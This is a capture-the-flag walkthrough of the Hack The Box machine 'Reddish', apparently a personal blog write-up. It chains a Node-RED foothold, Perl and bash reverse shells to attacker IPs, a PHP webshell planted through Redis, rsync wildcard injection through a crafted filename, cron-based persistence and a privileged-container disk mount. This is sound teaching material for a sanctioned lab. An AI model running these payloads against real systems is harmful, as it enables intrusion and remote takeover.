---
"title": "Hack The Box - Reddish"
"date": 2020-08-29
"tags": ["linux", "insane", "cron", "docker", "nmap_static", "pivot", "port_fwd"]
"keywords": ["linux", "insane", "cron", "docker", "nmap_static", "pivot", "port_fwd"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "This box is full docker, Finding each way to escape the container and finally there is a misconfiguration in a container which leads us to mount the entire drive. This box requires lot of enumeration."
"featured_image": "/img/htb-reddish/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-reddish/Untitled.png)

This box is full docker, Finding each way to escape the container and finally there is a misconfiguration in a container which leads us to mount the entire drive. This box requires lot of enumeration.

Link: [https://www.hackthebox.eu/home/machines/profile/147](https://www.hackthebox.eu/home/machines/profile/147)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1880/tcp)
HOP RTT       ADDRESS
1   258.30 ms 10.10.14.1
2   258.44 ms 10.10.10.94
```

## Node JS Enumeration

We have only one open port. So I Checked that, I give me some HTTP Method error. 

![Untitled](/img/htb-reddish/Untitled%201.png)

I just captured the request in the burp and change the request to POST and I got a response. It contains an ID and Path. We can access that path only with ID.

![Untitled](/img/htb-reddish/Untitled%202.png)

I just copied the ID and accessed `/red/ID`. Its Node-Red.

![Untitled](/img/htb-reddish/Untitled%203.png)

**What is Node-RED?**

- Node-RED is a flow-based development tool for visual programming developed originally by IBM for wiring together hardware devices, APIs and online services as part of the Internet of Things. Node-RED provides a web browser-based flow editor, which can be used to create JavaScript functions

## Node-Red Shell

I just look at all the options we have in the left panel and Items can be dragged into the center panel, and connect with wires. Once my flow is complete, We can hit “Deploy”, and the flow is run.

I decided to make a flow that gives me a shell. So First I took from Input "TCP" and added my details of IP and Port.

![Untitled](/img/htb-reddish/Untitled%204.png)

Another TCP from the output category and in Type I selected "Reply to TCP" and Done.

![Untitled](/img/htb-reddish/Untitled%205.png)

We need to execute it right. so I added exec in between them and connected all those wires. And hit Deploy I got a shell as root.

![Untitled](/img/htb-reddish/Untitled%206.png)

The shell is not stable, so I tried to get reverse from it using various payloads and only perl worked.

```bash
perl -e 'use Socket;$i="10.10.14.30";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Now I got a good shell

![Untitled](/img/htb-reddish/Untitled%207.png)

The first thing I tested is IP address, because we are root so I doubted we are in docker. and Yes we are inside a container. I got 2 more IP's other than 10.10.10.95 (Box IP).

```bash
# ip addr
1: lo: [LOOPBACK,UP,LOWER_UP](LOOPBACK,UP,LOWER_UP) mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth1@if12: [BROADCAST,MULTICAST,UP,LOWER_UP](BROADCAST,MULTICAST,UP,LOWER_UP) mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
13: eth0@if14: [BROADCAST,MULTICAST,UP,LOWER_UP](BROADCAST,MULTICAST,UP,LOWER_UP) mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

So I just created an one liner to ping sweep the hosts.

```bash
# for i in $(seq 1 20); do (ping -c 1 172.18.0.$i | grep "bytes from"); done
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.032 ms
# for i in $(seq 1 20); do (ping -c 1 172.19.0.$i | grep "bytes from"); done
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.106 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.088 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.170 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.022 ms
```

- We got a few IP's and mostly .1 will be the host.
- 172.19.0.3 is our IP (Node-Red)
- 172.18.0.2 (Node-Red)
- 172.19.0.2 and 172.19.0.4 are suspicious for now.

These are my assumptions for now.

### Port Scanning using Static Nmap

We can also use a static binary of Nmap.

- [https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64)

Static Nmap requires `/etc/services` too so I copied them to the box using netcat.

```bash
root@kali:~/boxes/reddish# nc -lnvp 5555 < nmap 
listening on [any] 5555 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.94] 46786
root@kali:~/boxes/reddish# nc -lnvp 5555 < services
listening on [any] 5555 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.94] 46788
```

This is an easier way to transfer file.

And I got those files.

```bash
# bash -c "cat [ /dev/tcp/10.10.14.30/5555 ]( /dev/tcp/10.10.14.30/5555 ) nmap"
# bash -c "cat [ /dev/tcp/10.10.14.30/5555 ]( /dev/tcp/10.10.14.30/5555 ) services"
# cp services /etc/
```

I ran Nmap on those 2 IP's and got few port opened.

```bash
# ./nmap -p- -sT --min-rate 5000 172.19.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-08-19 07:42 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00018s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  unknown
MAC Address: 02:42:AC:13:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds
# ./nmap -p- -sT --min-rate 5000 172.19.0.4

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-08-19 07:42 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for reddish_composition_www_1.reddish_composition_internal-network (172.19.0.4)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00021s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:13:00:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

### Port Scanning using Bash Script

```bash
# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.19.0.2/$p && echo "$p open") 2>/dev/null; done'
6379 open
# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.19.0.4/$p && echo "$p open") 2>/dev/null; done'
80 open
```

### Port Scanning using Metasploit

We can also do Pivoting using Metasploit, for that get a meterpreter shell first.

```bash
# ^Z
Background session 3? [y/N]  y
msf5 exploit(multi/handler) > sessions -u 3
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3]

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.30:4433 
[*] Sending stage (980808 bytes) to 10.10.10.94
[*] Command stager progress: 100.00% (773/773 bytes)

meterpreter >
```

**Reference:**

- [https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

Use `scanner/portscan/tcp` this module and run the scan on which IP we need to.

```bash
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.19.0.2
RHOSTS => 172.19.0.2
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
PORTS => 1-1000
msf5 auxiliary(scanner/portscan/tcp) > run
[+] 172.19.0.2:           - 172.19.0.2:80 - TCP OPEN
[*] 172.19.0.2:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So all the results are same.

## Port Forwarding

So first I decided to check the Port 80, I used meterpreter to Port Fwd it.

```bash
meterpreter > portfwd --help
Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -L [opt](opt)  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i [opt](opt)  Index of the port forward entry to interact with (see the "list" command).
    -l [opt](opt)  Forward: local port to listen on. Reverse: local port to connect to.
    -p [opt](opt)  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r [opt](opt)  Forward: remote host to connect to.
meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80
[*] Local TCP relay created: :80 [-](-) 172.19.0.4:80
```

## Redis Container

Now I can access the webpage locally from my machine.

![Untitled](/img/htb-reddish/Untitled%208.png)

It seems a default page, Let's run GoBuster.

### GoBuster Scan Results

```bash
root@kali:~# gobuster dir -u http://127.0.0.1/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://127.0.0.1/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/18 23:57:14 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/info.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/19 00:01:45 Finished
===============================================================
```

We only have PHP Info file.

![Untitled](/img/htb-reddish/Untitled%209.png)

I just went back to the index and checked the source code. And here it reveals some new directory.

![Untitled](/img/htb-reddish/Untitled%2010.png)

I tried to see what's the output and its just reply a number.

```bash
root@kali:~/boxes/reddish# curl http://127.0.0.1/8924d0549008565c554f8128cd11fda4/ajax.php?test=get%20hits
5
```

I tried for any LFI available and it failed.

![Untitled](/img/htb-reddish/Untitled%2011.png)

I better leave this webpage and check what's in the other IP.

We know 172.19.0.2 IP only have 6379 port open. So I Port Fwd it too.

```bash
meterpreter > portfwd add -l 6379 -r 172.19.0.2 -p 6379
[*] Local TCP relay created: :6379 [-](-) 172.19.0.2:6379
```

I ran Nmap scan on it and its a redis service.

```bash
root@kali:~/boxes/reddish# nmap -A -p6379 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-19 03:51 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000049s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
```

There are possibilities to get a shell from here.

We can interact with it using redis-cli. While checking the info, I came to know I'm in the role of slave. We need to have Master role to do some Privilege Work.

```bash
root@kali:~/boxes/reddish/Redis-RCE# sudo redis-cli -h 127.0.0.1
127.0.0.1:6379> info
.
.
.
.
.
.
# Replication
role:slave
```

So I changed my role to Master.

```bash
127.0.0.1:6379> slaveof no one
OK
(0.55s)
127.0.0.1:6379> info
.
.
.
.
.
.
# Replication
role:master
```

Reference:

> [https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)

> [https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

> [https://stackoverflow.com/questions/34155977/redis-promoting-a-slave-to-master-manually](https://stackoverflow.com/questions/34155977/redis-promoting-a-slave-to-master-manually)

Now its time to get a shell, I created a webshell payload. By following HackTricks. So Where we upload it? We don't know the exact location? But if we recall, We already saw some web directory from the webpage's source code. So I tried with them.

```bash
root@kali:~/boxes/reddish# (echo -e "\n\n"; cat shell.php; echo -e "\n\n") > wolf.php
root@kali:~/boxes/reddish# cat wolf.php 

[?php system($_REQUEST['wolf']); ?](?php system($_REQUEST['wolf']); ?)

root@kali:~/boxes/reddish# redis-cli -h 127.0.0.1 flushall
OK
root@kali:~/boxes/reddish# cat wolf.php | redis-cli -h 127.0.0.1 -x set crackit
OK
root@kali:~/boxes/reddish# redis-cli -h 127.0.0.1
127.0.0.1:6379> config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
OK
(0.56s)
127.0.0.1:6379> config get dir
1) "dir"
2) "/var/www/html/8924d0549008565c554f8128cd11fda4"
(0.55s)
127.0.0.1:6379> config set dbfilename "wolf.php"
OK
(0.56s)
127.0.0.1:6379> save
OK
(0.55s)
127.0.0.1:6379>
```

And Yes it worked.

![Untitled](/img/htb-reddish/Untitled%2012.png)

I used various payload and only perl payload works again.

```bash
http://127.0.0.1/8924d0549008565c554f8128cd11fda4/wolf.php?wolf=perl%20-e%20%27use%20Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d9000%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b}%3b%27
```

I got a shell in the new Container.

```bash
# ./ncat -lnvp 9000
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::9000
Ncat: Listening on 0.0.0.0:9000
Ncat: Connection from 172.19.0.4.
Ncat: Connection from 172.19.0.4:41462.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

## Privilege Escalation

I uploaded pspy and checked for anything running suspicious and found a backup.sh running.

```bash
2020/08/19 10:57:01 CMD: UID=0    PID=1568   | sh /backup/backup.sh 
2020/08/19 10:57:02 CMD: UID=0    PID=1569   | rsync -a rsync://backup:873/src/backup/ /var/www/html/
```

`backup.sh`

```bash
$ cat /backup/backup.sh
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

It is saving the database using rsync, then removing the web folders and bringing them back in from a host named backup.

**What is rsync?**

rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. Rsync is written in C as a single threaded application

### Exploiting WildCard

We can exploit the command that uses the wildcard `*` . If u see closely Its looking for a file in `.rdb` extension, So I created a file as `-e sh shell.rdb` and put my `shell.sh` in the same directory.

```bash
$ cd /tmp
$ cat shell.sh
bash -c "bash -i >& /dev/tcp/172.19.0.3/5555 0>&1"
$ cd f187a0ec71ce99642e4f0afbd441a68b
$ ls
$ cp /tmp/shell.sh shell.rdb
$ echo "" > "-e sh shell.rdb"
$ ls -la
total 16
-rw-r--r-- 1 www-data www-data    1 Aug 19 12:19 -e sh shell.rdb
drwxr-xr-x 2 www-data www-data 4096 Aug 19 12:19 .
drwxr-xr-x 5 root     root     4096 Jul 15  2018 ..
-rw-r--r-- 1 www-data www-data   51 Aug 19 12:19 shell.rdb
```

- -e, --rsh=COMMAND specify the remote shell to use

**Reference:**

- [https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

And started my netcat, Since its inside a container It doesn't have  a connection with my kali machine. So I just used one of the container shells we got already and Uploaded a ncat. And I got shell as root in `www`

```bash
# ./ncat -lvnp 5555
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 172.19.0.4.
Ncat: Connection from 172.19.0.4:49770.
bash: cannot set terminal process group (2050): Inappropriate ioctl for device
bash: no job control in this shell
root@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b# whoami
whoami
root
root@www:/tmp# hostname
hostname
www
```

Again I checked the IP address. Now this time I got new host 172.20.0.3, I did a ping sweep on it.

```bash
root@www:/tmp# ip addr
ip addr
1: lo: [LOOPBACK,UP,LOWER_UP](LOOPBACK,UP,LOWER_UP) mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
15: eth0@if16: [BROADCAST,MULTICAST,UP,LOWER_UP](BROADCAST,MULTICAST,UP,LOWER_UP) mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth0
       valid_lft forever preferred_lft forever
17: eth1@if18: [BROADCAST,MULTICAST,UP,LOWER_UP](BROADCAST,MULTICAST,UP,LOWER_UP) mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
```

## Backup Container

```bash
root@www:/tmp# for i in $(seq 1 20); do (ping -c 1 172.20.0.$i | grep "bytes from"); done
<eq 1 20); do (ping -c 1 172.20.0.$i | grep "bytes from"); done              
64 bytes from 172.20.0.1: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 172.20.0.2: icmp_seq=1 ttl=64 time=0.067 ms
64 bytes from 172.20.0.3: icmp_seq=1 ttl=64 time=0.038 ms
```

- .1 will be the host
- .2 is something we need to look.
- .3 is our IP

I did a portscan on it and only Port 873 is open. Now It makes sense that it’s open on 873, rsync, which is how www was connecting to it.

```bash
root@www:/tmp# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.20.0.2/$p && echo "$p open") 2>/dev/null; done'
873 open
```

I tried to enumerate the rsync. By using `--list-only` it will list us everything.

```bash
root@www:/tmp# which rsync
which rsync
/usr/bin/rsync
root@www:/tmp# /usr/bin/rsync -av --list-only rsync://172.20.0.2/src/backup
/usr/bin/rsync -av --list-only rsync://172.20.0.2/src/backup
receiving incremental file list
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
-rw-r--r--          2,023 2018/05/04 19:55:07 backup/index.html
-rw-r--r--             17 2018/05/04 19:55:07 backup/info.php
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup/8924d0549008565c554f8128cd11fda4
-rw-r--r--            280 2018/05/04 19:55:07 backup/8924d0549008565c554f8128cd11fda4/ajax.php
-rw-r--r--             40 2018/05/04 19:55:07 backup/8924d0549008565c554f8128cd11fda4/config.ini
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup/8924d0549008565c554f8128cd11fda4/lib
-rw-r--r--          1,317 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/Autoloader.php
-rw-r--r--          4,307 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/Client.php
-rw-r--r--          1,739 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/Config.php
-rw-r--r--          1,252 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/JsonResult.php
-rw-r--r--            484 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/Pool.php
-rw-r--r--          2,935 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/Result.php
-rw-r--r--          1,261 2018/05/04 19:55:08 backup/8924d0549008565c554f8128cd11fda4/lib/Server.php
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup/assets
-rw-r--r--         78,601 2018/05/04 19:55:07 backup/assets/jquery.js
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup/f187a0ec71ce99642e4f0afbd441a68b

sent 29 bytes  received 564 bytes  1,186.00 bytes/sec
total size is 94,256  speedup is 158.95
```

rsync gives me full read and write access to backup (172.20.0.2) . I can read the file system:

```bash
root@www:/tmp# rsync rsync://172.20.0.2:873/src
rsync rsync://backup:873/src
drwxr-xr-x          4,096 2018/07/15 17:42:39 .
-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv
-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
drwxr-xr-x          4,096 2018/07/15 17:42:39 data
drwxr-xr-x          3,720 2020/08/19 05:57:02 dev
drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
drwxr-xr-x          4,096 2018/07/15 17:42:38 home
drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
drwxr-xr-x          4,096 2018/07/15 17:42:38 media
drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
dr-xr-xr-x              0 2020/08/19 05:57:02 proc
drwxr-xr-x          4,096 2018/07/15 17:42:39 rdb
drwx------          4,096 2018/07/15 17:42:38 root
drwxr-xr-x          4,096 2020/08/19 05:57:03 run
drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
dr-xr-xr-x              0 2020/08/19 11:02:11 sys
drwxrwxrwt          4,096 2020/08/19 13:19:01 tmp
drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
drwxr-xr-x          4,096 2018/07/15 17:42:39 var
```

Since we have a write permission, I decideded to create a cron job, so It will run automatically and I will get shell. For that We need 2 files one is reverse shell file and another one to put in `cron.d`

```bash
root@www:/tmp# echo 'bash -c "bash -i >& /dev/tcp/172.20.0.3/9001 0>&1"' > priv.sh
root@www:/tmp# cat priv.sh
cat priv.sh
bash -c "bash -i >& /dev/tcp/172.20.0.3/9001 0>&1"
root@www:/tmp# echo '* * * * * root sh /tmp/priv.sh' > priv 
echo '* * * * * root sh /tmp/priv.sh' > priv
root@www:/tmp# cat priv
cat priv
* * * * * root sh /tmp/priv.sh
```

While checking `cron.d` there is already something running.

```bash
root@www:/tmp# rsync rsync://backup:873/src/etc/cron.d/
rsync rsync://backup:873/src/etc/cron.d/
drwxr-xr-x          4,096 2020/08/19 13:27:48 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean
```

And I put those 2 files, where they belongs too. So Now the cron will run every minute and it will check for the reverse shell in the `/tmp` directory and executes it.

```bash
root@www:/tmp# rsync -a ./priv rsync://backup:873/src/etc/cron.d/
rsync -a ./priv rsync://backup:873/src/etc/cron.d/
root@www:/tmp# rsync -a ./priv.sh rsync://backup:873/src/tmp/
rsync -a ./priv.sh rsync://backup:873/src/tmp/
root@www:/tmp# rsync rsync://backup:873/src/tmp/
rsync rsync://backup:873/src/tmp/
drwxrwxrwt          4,096 2020/08/19 13:33:01 .
-rwxr-xr-x             51 2020/08/19 13:31:24 priv.sh
```

And Again I used one of the container to get shell.

```bash
$ ./ncat -lnvp 9001
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 172.20.0.2.
Ncat: Connection from 172.20.0.2:57536.
bash: cannot set terminal process group (2045): Inappropriate ioctl for device
bash: no job control in this shell
root@backup:~# whoami;hostname
whoami;hostname
root
backup
```

There is a misconfiguration that can come with docker is running with `--privileged`. I have access to the disks.

```bash
root@backup:/dev# ls
ls
agpgart
autofs
.
.
.
sda
sda1
sda2
sda3
sda4
sda5
sg0
sg1
shm
snapshot
snd
sr0
```

I just mounted sda1 and I get system access. Got Root Flag.

```bash
root@backup:/dev# mount /dev/sda1 /mnt
mount /dev/sda1 /mnt
root@backup:/dev# cd /mnt
cd /mnt
root@backup:/mnt# ls
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
root@backup:/mnt# cd root
cd root
root@backup:/mnt/root# ls
ls
root.txt
```

To get shell as root, we can use cron again. I just did the same as what I did before. 

```bash
root@backup:/mnt/tmp# echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/1010 0>&1"' > root.sh         
root@backup:/mnt/tmp# cd /mnt/etc/cron.d
cd /mnt/etc/cron.d
root@backup:/mnt/etc/cron.d# echo '* * * * * root sh /tmp/root.sh' > root
echo '* * * * * root sh /tmp/root.sh' > root
root@backup:/mnt/etc/cron.d# cat root
cat root
* * * * * root sh /tmp/root.sh
```

Got Shell as root@reddish

```bash
root@kali:~/boxes/reddish# nc -lnvp 1010
listening on [any] 1010 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.94] 42474
bash: cannot set terminal process group (29665): Inappropriate ioctl for device
bash: no job control in this shell
root@reddish:~# whoami;hostname
whoami;hostname
root
reddish
root@reddish:~#
```

We Own the Box!